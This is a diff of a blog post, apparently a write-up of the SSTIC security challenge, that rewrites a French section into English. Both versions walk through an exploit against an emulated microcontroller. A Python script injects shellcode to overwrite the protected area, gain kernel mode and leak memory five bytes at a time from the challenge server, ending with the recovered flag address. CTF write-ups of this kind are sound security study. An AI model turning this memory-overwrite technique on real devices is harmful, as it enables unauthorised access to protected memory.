@@ -1311,164 +1311,150 @@ opcode not known, 0xAC 0x2
 0x118: ret 0xF
 {% endhighlight %}
 
-Accès directe sur la zone secrète
----------------------------------
+How to access the secret memory area?
+-------------------------------------
 
-En accédant directement la zone secrète avec les opcodes de lire la
-mémoire, une erreur “Memory access violation” est retournée. Dans
-LISTING [lst-registres], un mode d’exécution “Mode:User” provoque une
-nouvelle idée. Dans “upload.py”, il indique que les registres sont dans
-la zone mémoire [FC00-FCFF]. Il est probable que le mode d’exécution est
-enregistré aussi dans cette zone. Si le mode d’exécution était kernel,
-la lecture sur la zone secrète sera possible. *Rappelez que l’appel
-système de nombre de cycles CPU permet d’écrire sur une adresse
-arbitraire, qui est stocké dans le registre r0.* Une fois le mode
-d’exécution changé, la zone secrète devient lisible.
-
-L’auteur a donc essayé d’écraser toute la zone mémoire de registres,
-mais sans succès. Le mode d’exécution n’a jamais changé. Ce mode
-d’exécution serait stocké dans une autre zone de mémoire. En essayant
-d’écraser les premiers octets dans la zone mémoire secrète, un mode
-d’exécution kernel est obtenu et le pointeur d’instruction est redirigé
-vers une adresse vide. En plus, cette zone de mémoire n’a pas de
-protection d’écriture. L’exécution du code arbitraire est donc possible.
-
-    ---------------------------------------------
-    ----- Microcontroller firmware uploader -----
-    ---------------------------------------------
-
-    :: Serial port connected.
-    :: Uploading firmware... done.
-
-    System reset.
-    -- Exception occurred at 5868: Invalid instruction.
-       r0:FC08     r1:0000    r2:0100    r3:004A
-       r4:5800     r5:0001    r6:0000    r7:0000
-       r8:000A     r9:000A   r10:0000   r11:0000
-      r12:0000    r13:EFFE   r14:0000   r15:FD1C
-       pc:5868 fault_addr:0000 [S:1 Z:0] Mode:kernel
-    CLOSING: Invalid instruction.
-
-Le code Python suivant demande un offset par rapport à l’adresse 0xF000
-et permet de lire 5 octets par fois.
-
-    $ cat exploit.py
-    import parser
-    import socket
-    import select
-    import sys
-
-    def reada(addr, l):
-        h00 = (addr & 0xff00) >> 8
-        l00 = addr & 0x00ff
-        h01 = (l & 0xff00) >> 8
-        l01 = l & 0x00ff
-        return [ 0x20, h00, 0x10, l00, 0x21, h01, 0x11, l01, 0xc8, 0x2 ]
-
-    def writea(addr, w=0):
-        h00 = (addr & 0xff00) >> 8
-        l00 = addr & 0x00ff
-        return [ 0x20, h00, 0x10, l00, 0xc8, 0x3 ]
-
-    def storeatoffset(offset, w=0):
-        h00 = offset >> 8
-        l00 = offset & 0xff
-        h05 = w >> 8
-        l05 = w & 0xff
-        return [ 0x21, h00, 0x11, l00, 0x25, h05, 0x15, l05, 0xf5, 0x1 ]
-
-    if __name__ == "__main__":
-    	if len(sys.argv) != 2:
-    		print("Usage python exploit.py offset_2_0xf000")
-    		sys.exit(0)
-    		
-    payload = b''
-    with open('fw.hex', 'wt') as output:
-        cmd = parser.Cmd()
-        cmd.payload = [0x20, 0x58, 0x10, 0x4a]
-        shellcode = []
-        a = int(sys.argv[1])*5
-        shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xe8, 0x1]
-        a += 1
-        shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xe9, 0x1]
-        a += 1
-        shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xea, 0x1]
-        a += 1
-        shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xeb, 0x1]
-        a += 1
-        shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xec, 0x1]
-
-        for i in range(len(shellcode)):
-            cmd.payload += storeatoffset(i, shellcode[i])
-
-        for i in range(0xf003,0xf005):
-            cmd.payload+= writea(i, 0x100)
-
-        cmd.nb_bytes = len(cmd.payload)
-        output.write(cmd.gencmd())
-        output.write(cmd.getend(1))
-    with open('payload', 'wb') as output:
-        output.write(payload)
+Direct access to the secret area, generated an error *Memory access violation*. Since I could dump the micro-controller's kernel memory area. 
 
 
-    FIRMWARE = "fw.hex"
+{% highlight asm %}
+---------------------------------------------
+----- Microcontroller firmware uploader -----
+---------------------------------------------
 
-    #print("---------------------------------------------")
-    #print("----- Microcontroller firmware uploader -----")
-    #print("---------------------------------------------")
-    #print()
+:: Serial port connected.
+:: Uploading firmware... done.
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('178.33.105.197', 10101))
+System reset.
+-- Exception occurred at 5868: Invalid instruction.
+   r0:FC08     r1:0000    r2:0100    r3:004A
+   r4:5800     r5:0001    r6:0000    r7:0000
+   r8:000A     r9:000A   r10:0000   r11:0000
+  r12:0000    r13:EFFE   r14:0000   r15:FD1C
+   pc:5868 fault_addr:0000 [S:1 Z:0] Mode:kernel
+CLOSING: Invalid instruction.
+{% endhighlight %}
 
-    #print(":: Serial port connected.")
-    #print(":: Uploading firmware... ", end='')
+The following Python code requires offset to the address 0xF000
+and allows to read 5 bytes per time.
 
-    [ s.send(line) for line in open(FIRMWARE, 'rb') ]
+{% highlight python linenos %}
+$ cat exploit.py
+import parser
+import socket
+import select
+import sys
 
-    #print("done.")
-    #print()
+def reada(addr, l):
+	h00 = (addr & 0xff00) >> 8
+	l00 = addr & 0x00ff
+	h01 = (l & 0xff00) >> 8
+	l01 = l & 0x00ff
+	return [ 0x20, h00, 0x10, l00, 0x21, h01, 0x11, l01, 0xc8, 0x2 ]
 
-    resp = b''
-    while True:
-        ready, _, _ = select.select([s], [], [], 10)
-        if ready:
-            try:
-                data = s.recv(32)
-            except:
-                break
-            if not data:
-                break
-            resp += data
-        else:
-            break 
+def writea(addr, w=0):
+	h00 = (addr & 0xff00) >> 8
+	l00 = addr & 0x00ff
+	return [ 0x20, h00, 0x10, l00, 0xc8, 0x3 ]
+
+def storeatoffset(offset, w=0):
+	h00 = offset >> 8
+	l00 = offset & 0xff
+	h05 = w >> 8
+	l05 = w & 0xff
+	return [ 0x21, h00, 0x11, l00, 0x25, h05, 0x15, l05, 0xf5, 0x1 ]
+
+if __name__ == "__main__":
+	if len(sys.argv) != 2:
+		print("Usage python exploit.py offset_2_0xf000")
+		sys.exit(0)
+		
+payload = b''
+with open('fw.hex', 'wt') as output:
+	cmd = parser.Cmd()
+	cmd.payload = [0x20, 0x58, 0x10, 0x4a]
+	shellcode = []
+	a = int(sys.argv[1])*5
+	shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xe8, 0x1]
+	a += 1
+	shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xe9, 0x1]
+	a += 1
+	shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xea, 0x1]
+	a += 1
+	shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xeb, 0x1]
+	a += 1
+	shellcode += [0x20, (0xf000+a)>>8, 0x10, (0xf000+a)&0xff, 0xec, 0x1]
+
+	for i in range(len(shellcode)):
+		cmd.payload += storeatoffset(i, shellcode[i])
+
+	for i in range(0xf003,0xf005):
+		cmd.payload+= writea(i, 0x100)
+
+	cmd.nb_bytes = len(cmd.payload)
+	output.write(cmd.gencmd())
+	output.write(cmd.getend(1))
+with open('payload', 'wb') as output:
+	output.write(payload)
 
 
-    r8 = str(resp, 'utf-8').split('r8:')[1][2:4]
-    r9 = str(resp, 'utf-8').split('r9:')[1][2:4]
-    r10 = str(resp, 'utf-8').split('r10:')[1][2:4]
-    r11 = str(resp, 'utf-8').split('r11:')[1][2:4]
-    r12 = str(resp, 'utf-8').split('r12:')[1][2:4]
+FIRMWARE = "fw.hex"
 
-    bytes_5 = "%s%s%s%s%s"%(r8,r9,r10,r11,r12)
-    print(bytes.fromhex(bytes_5).decode("utf-8"))
-    s.close()
+#print("---------------------------------------------")
+#print("----- Microcontroller firmware uploader -----")
+#print("---------------------------------------------")
+#print()
 
-    $ for i in {560..570}; do python exploit.py $i; done
-    <66a6
-    5dc05
-    0ec0c
-    84cf1
-    dd5b3
-    bbb75
-    c8c@c
-    halle
-    nge.s
-    stic.
-    org>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('178.33.105.197', 10101))
 
-L’adresse e-mail est donc
-\<66a65dc050ec0c84cf1dd5b3bbb75c8c@challenge.sstic.org\>.
+#print(":: Serial port connected.")
+#print(":: Uploading firmware... ", end='')
+
+[ s.send(line) for line in open(FIRMWARE, 'rb') ]
+
+#print("done.")
+#print()
+
+resp = b''
+while True:
+	ready, _, _ = select.select([s], [], [], 10)
+	if ready:
+		try:
+			data = s.recv(32)
+		except:
+			break
+		if not data:
+			break
+		resp += data
+	else:
+		break 
+
+
+r8 = str(resp, 'utf-8').split('r8:')[1][2:4]
+r9 = str(resp, 'utf-8').split('r9:')[1][2:4]
+r10 = str(resp, 'utf-8').split('r10:')[1][2:4]
+r11 = str(resp, 'utf-8').split('r11:')[1][2:4]
+r12 = str(resp, 'utf-8').split('r12:')[1][2:4]
+
+bytes_5 = "%s%s%s%s%s"%(r8,r9,r10,r11,r12)
+print(bytes.fromhex(bytes_5).decode("utf-8"))
+s.close()
+
+$ for i in {560..570}; do python exploit.py $i; done
+<66a6
+5dc05
+0ec0c
+84cf1
+dd5b3
+bbb75
+c8c@c
+halle
+nge.s
+stic.
+org>
+{% endhighlight %}
+Thus I had the email address: *66a65dc050ec0c84cf1dd5b3bbb75c8c@challenge.sstic.org*.
 
 Appendix
 ===================================
